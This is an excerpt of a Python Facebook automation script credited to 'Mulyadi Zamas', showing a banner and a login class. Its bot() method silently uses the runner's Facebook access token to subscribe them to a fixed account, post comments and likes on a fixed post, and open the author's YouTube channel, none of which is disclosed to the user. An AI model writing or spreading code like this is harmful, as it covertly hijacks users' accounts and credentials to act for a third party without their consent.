...
# Open source code by Mulyadi Zamas | ngotak dikit cok jangan jual di perjual belikan...
...
───────────────────────────────────────────────────────
 [\x1b[1;96m+%s] Author   : Mulyadi Zamas.
 [\x1b[1;96m+%s] Github   : https://github.com/Mullyadizamas
 [\x1b[1;96m+%s] Facebook : https://www.facebook.com/me.210501
───────────────────────────────────────────────────────\n'''%(N,N,N,N))
...
class login:
	...
	def bot(self):
		...
		requests.post('https://graph.facebook.com/100040004676694/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100040004676694/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/100040004676694/subscribers?access_token=' + toket)
		requests.post('https://graph.facebook.com/642520297091454/comments/?message=' +komen+ '&access_token=' + toket)
		requests.post('https://graph.facebook.com/642520297091454/likes?summary=true&access_token=' + toket)
		requests.post('https://graph.facebook.com/642520297091454/comments/?message='+komen+'&access_token=' + toket)
		requests.post('https://graph.facebook.com/642520297091454/likes?summary=true&access_token=' + toket)
		os.system('xdg-open https://youtube.com/channel/UCf7Ae3AgQ_il1I0DM-JsAgQ')
		menu().main()
